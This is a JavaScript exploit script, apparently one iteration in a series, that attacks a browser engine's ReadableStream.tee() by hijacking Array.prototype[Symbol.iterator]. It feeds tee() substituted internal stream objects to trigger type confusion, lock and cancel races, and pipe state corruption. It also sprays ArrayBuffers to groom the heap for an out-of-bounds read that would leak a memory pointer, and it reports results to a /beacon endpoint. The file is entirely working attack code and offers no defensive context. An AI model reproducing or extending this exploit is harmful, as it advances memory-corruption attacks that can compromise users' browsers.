/*
 * p433 -- ReadableStream.tee() type confusion exploitation
 *
 * V432 CONFIRMED:
 *   - Test B: Plain object wrapped as ReadableStream (type confusion)
 *   - Test C: ArrayBuffer wrapped as ReadableStream
 *   - Test E: OOB 1-element crash consistent with V430
 *   - getReader() fails with "undefined is not an object" due to missing private slots
 *
 * Strategy: We need private slots. Two approaches:
 *   A: Capture a REAL internal stream from tee1, use it as substitute in tee2
 *      -> Two different tee pull functions operating on the same internal stream
 *   B: Cross-stream controller confusion: A's internal used in B's tee
 *      -> B's pull writes to B's real branch, but C++ returns A's internal
 *   C: Concurrent reads from shared internal via A.tee() substituted
 *   D: State transition confusion: close one side, read the other
 *   E: Error one side during active read of other
 *
 * Beacon prefix: V433-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V433-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

// Utility: capture internal stream objects from a tee
function captureTeeInternals(rs) {
  var captured = {branch0: null, branch1: null};
  var done = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !done) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        done = true;
        captured.branch0 = self[0];
        captured.branch1 = self[1];
      }
    }
    return origIter.call(self);
  };

  var branches = rs.tee();
  Array.prototype[Symbol.iterator] = origIter;

  return {branches: branches, internals: captured};
}

// ================================================================
// Test A: Cross-tee controller confusion
// Tee stream1, capture its internal objects
// Tee stream2, substitute stream2's branch1 with stream1's branch0
// Now stream2's tee pull enqueues to stream2's real branch1
// But the C++ ReadableStream wraps stream1's branch0 internal
// -> Reading from the C++ stream reads from stream1's branch, not stream2's
// ================================================================

function testA() {
  B("A-START");

  var ctrl1;
  var stream1 = new ReadableStream({
    start: function(c) { ctrl1 = c; }
  });

  var ctrl2;
  var stream2 = new ReadableStream({
    start: function(c) { ctrl2 = c; }
  });

  // Tee stream1 normally, capture internals
  var t1 = captureTeeInternals(stream1);
  B("A-T1", {
    hasBranch0: !!t1.internals.branch0,
    hasBranch1: !!t1.internals.branch1
  });

  // Tee stream2, but substitute branch1 with stream1's internal branch0
  var substituted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !substituted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        substituted = true;
        B("A-SUB");
        // Return: [stream2's real branch0, stream1's branch0]
        var items = [self[0], t1.internals.branch0];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var t2branches = stream2.tee();
    Array.prototype[Symbol.iterator] = origIter;

    B("A-TEE2-OK", {len: t2branches.length});

    // t2branches[1] is a ReadableStream wrapping stream1's internal branch0
    // It has the right private slots because it IS a real internal stream

    // Enqueue to stream1 -- should flow to t1's branches including branch0
    ctrl1.enqueue("FROM-STREAM1");

    // Enqueue to stream2 -- should flow to t2's branches
    // But t2branches[1] points to stream1's branch0, not stream2's real branch1
    ctrl2.enqueue("FROM-STREAM2");

    // Read from t2branches[1] -- this should read from stream1's branch0
    var r1 = t2branches[1].getReader();
    B("A-READER-OK");

    r1.read().then(function(res) {
      B("A-READ", {done: res.done, val: String(res.value).slice(0, 40)});
      // If val is "FROM-STREAM1", cross-stream confusion works!
      // If val is "FROM-STREAM2", no confusion (stream2's data)
    }).catch(function(e) {
      B("A-READ-ERR", e.message.slice(0, 60));
    });

    // Also read from t1's actual branches to see if they're affected
    var t1r0 = t1.branches[0].getReader();
    t1r0.read().then(function(res) {
      B("A-T1R0", {done: res.done, val: String(res.value).slice(0, 40)});
    }).catch(function(e) {
      B("A-T1R0-ERR", e.message.slice(0, 60));
    });

  } catch(e) {
    B("A-ERR", e.message.slice(0, 80));
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test B: Double-controller race
// Two tees share the same internal stream object
// Both tee pull functions try to manage it
// ================================================================

function testB() {
  B("B-START");

  var ctrl1;
  var stream1 = new ReadableStream({
    start: function(c) { ctrl1 = c; }
  });

  // Capture stream1's tee internals
  var t1 = captureTeeInternals(stream1);

  // Now create stream2 and tee it, substituting BOTH branches with stream1's internals
  var ctrl2;
  var stream2 = new ReadableStream({
    start: function(c) { ctrl2 = c; }
  });

  var substituted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !substituted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        substituted = true;
        B("B-SUB");
        var items = [t1.internals.branch0, t1.internals.branch1];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var t2branches = stream2.tee();
    Array.prototype[Symbol.iterator] = origIter;
    B("B-TEE2-OK");

    // Now t1.branches and t2branches both wrap the SAME internal stream objects
    // stream1's tee pull and stream2's tee pull both operate on these internals
    // Enqueue data on both streams simultaneously
    ctrl1.enqueue("S1-DATA");
    ctrl2.enqueue("S2-DATA");

    // Read from t2branches[0] -- it's stream1's branch0, also locked by t1
    try {
      var r = t2branches[0].getReader();
      B("B-R0-OK");
      r.read().then(function(res) {
        B("B-R0-READ", {done: res.done, val: String(res.value).slice(0, 40)});
      }).catch(function(e) {
        B("B-R0-READ-ERR", e.message.slice(0, 60));
      });
    } catch(e) {
      B("B-R0-ERR", e.message.slice(0, 60));
    }

    // Read from t1.branches[0] -- should be locked since t2 already locked it?
    // Or does each ReadableStream wrapper have its own lock state?
    try {
      var r2 = t1.branches[0].getReader();
      B("B-T1R0-OK");
      r2.read().then(function(res) {
        B("B-T1R0-READ", {done: res.done, val: String(res.value).slice(0, 40)});
      }).catch(function(e) {
        B("B-T1R0-READ-ERR", e.message.slice(0, 60));
      });
    } catch(e) {
      B("B-T1R0-ERR", e.message.slice(0, 60));
    }

  } catch(e) {
    B("B-ERR", e.message.slice(0, 80));
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test C: Close-during-read confusion
// Get two ReadableStream wrappers pointing to same internal
// Start a read on one, close the underlying source via the other
// ================================================================

function testC() {
  B("C-START");

  var ctrl;
  var stream = new ReadableStream({
    start: function(c) { ctrl = c; }
  });

  var t1 = captureTeeInternals(stream);

  // Tee again, both branches = same internal
  var stream2 = new ReadableStream({
    start: function(c) { c.enqueue("dummy"); }
  });

  var substituted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !substituted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        substituted = true;
        var items = [t1.internals.branch0, t1.internals.branch0]; // SAME internal twice
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var t2branches = stream2.tee();
    Array.prototype[Symbol.iterator] = origIter;
    B("C-TEE2-OK");

    // t2branches[0] and t2branches[1] both wrap stream1's branch0
    // t1.branches[0] also wraps stream1's branch0
    // Three ReadableStream wrappers, one internal

    // Lock via t2branches[0], start read
    var reader1 = t2branches[0].getReader();
    B("C-R1-OK");

    var readPromise = reader1.read();
    B("C-READ-STARTED");

    // Now cancel via t1.branches[0] -- same internal stream
    t1.branches[0].cancel("force-cancel").then(function() {
      B("C-CANCEL-OK");
    }).catch(function(e) {
      B("C-CANCEL-ERR", e.message.slice(0, 60));
    });

    // Check what the pending read resolves to
    readPromise.then(function(res) {
      B("C-READ-RESULT", {done: res.done, val: typeof res.value});
    }).catch(function(e) {
      B("C-READ-RESULT-ERR", e.message.slice(0, 60));
    });

    // Enqueue AFTER cancel
    ctrl.enqueue("AFTER-CANCEL");
    B("C-ENQUEUE-AFTER");

    // Try to read from t2branches[1] -- same internal, should be cancelled?
    try {
      var reader2 = t2branches[1].getReader();
      B("C-R2-OK");
      reader2.read().then(function(res) {
        B("C-R2-READ", {done: res.done, val: typeof res.value});
      }).catch(function(e) {
        B("C-R2-READ-ERR", e.message.slice(0, 60));
      });
    } catch(e) {
      B("C-R2-LOCK-ERR", e.message.slice(0, 60));
    }

  } catch(e) {
    B("C-ERR", e.message.slice(0, 80));
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test D: Force error into shared internal during active pipe
// pipeTo writes to a WritableStream from a ReadableStream backed by shared internal
// Error the internal mid-pipe via the other wrapper
// ================================================================

function testD() {
  B("D-START");

  var ctrl;
  var stream = new ReadableStream({
    start: function(c) { ctrl = c; }
  });

  var t1 = captureTeeInternals(stream);

  // Get second wrapper to same internal
  var stream2 = new ReadableStream({
    start: function(c) { c.enqueue("x"); }
  });

  var substituted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !substituted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        substituted = true;
        var items = [t1.internals.branch0, self[1]]; // branch0 from stream1, real branch1
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var t2branches = stream2.tee();
    Array.prototype[Symbol.iterator] = origIter;
    B("D-TEE2-OK");

    // t2branches[0] wraps stream1's branch0

    // Create a writable sink that collects data
    var chunks = [];
    var ws = new WritableStream({
      write: function(chunk) {
        chunks.push(chunk);
        B("D-WRITE", {chunk: String(chunk).slice(0, 30), total: chunks.length});
      },
      close: function() {
        B("D-WS-CLOSE", {total: chunks.length});
      },
      abort: function(reason) {
        B("D-WS-ABORT", {reason: String(reason).slice(0, 40), total: chunks.length});
      }
    });

    // Start piping t2branches[0] (stream1's branch0) to ws
    var pipePromise = t2branches[0].pipeTo(ws);
    B("D-PIPE-STARTED");

    // Enqueue data via stream1's controller
    ctrl.enqueue("PIPE-DATA-1");
    ctrl.enqueue("PIPE-DATA-2");

    // Now error the internal via t1.branches[0] (same internal object)
    // This should corrupt the pipe's state
    setTimeout(function() {
      try {
        // Cancel is one way to disrupt
        t1.branches[0].cancel("DISRUPTION").then(function() {
          B("D-DISRUPT-OK");
        }).catch(function(e) {
          B("D-DISRUPT-ERR", e.message.slice(0, 60));
        });
      } catch(e) {
        B("D-DISRUPT-CATCH", e.message.slice(0, 60));
      }

      ctrl.enqueue("AFTER-DISRUPT");
      ctrl.close();

      pipePromise.then(function() {
        B("D-PIPE-DONE", {chunks: chunks.length});
      }).catch(function(e) {
        B("D-PIPE-ERR", e.message.slice(0, 60));
      });
    }, 100);

  } catch(e) {
    B("D-ERR", e.message.slice(0, 80));
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test E: Heap groomed OOB -- controlled adjacent allocation
// Use ArrayBuffer spray at exact size to fill freed slots
// Then 1-element tee to read adjacent AB backing store pointer
// ================================================================

function testE() {
  B("E-START");

  // Phase 1: Determine Vector allocation size
  // Vector<Strong<JSObject>> with capacity N uses N * sizeof(Strong<JSObject>)
  // Strong<JSObject> = 8 bytes (pointer)
  // Default initial capacity is likely 16, so 128 bytes allocated
  // With 1 element, results[1] reads offset +8 in a 128-byte allocation

  // Spray: allocate and free objects at the same bmalloc size class
  // to leave our pointers in the freed slot that Vector will reuse
  var spray = [];
  for (var i = 0; i < 500; i++) {
    spray.push(new ArrayBuffer(128));
  }
  // Free half to create holes with known content (AB backing store pointers)
  var freed = [];
  for (var i = 0; i < 500; i += 2) {
    freed.push(spray[i]);
    spray[i] = null;
  }

  // Force GC to process frees
  for (var i = 0; i < 100; i++) {
    new ArrayBuffer(1024);
  }

  B("E-GROOM", {kept: spray.filter(function(x){return x !== null;}).length});

  var rs = new ReadableStream({
    start: function(c) { c.enqueue("e"); c.close(); }
  });

  var intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        B("E-INTERCEPT");
        var items = [self[0]]; // 1 element only
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
    B("E-TEE-OK", {
      len: branches.length,
      type1: branches[1] ? branches[1].constructor.name : "null"
    });

    if (branches[1]) {
      // We got something from the OOB! What is it?
      try {
        B("E-OOB-INFO", {
          ctor: branches[1].constructor.name,
          isRS: branches[1] instanceof ReadableStream,
          type: typeof branches[1]
        });
      } catch(e) {
        B("E-OOB-INFO-ERR", e.message.slice(0, 60));
      }
    }
  } catch(e) {
    B("E-ERR", e.message.slice(0, 80));
    Array.prototype[Symbol.iterator] = origIter;
  }

  B("E-DONE");
}

// Run tests sequentially with enough time
testA();
setTimeout(function() { testB(); }, 1500);
setTimeout(function() { testC(); }, 3000);
setTimeout(function() { testD(); }, 4500);
setTimeout(function() { testE(); }, 6500);
setTimeout(function() { B("DONE"); }, 9000);
})();
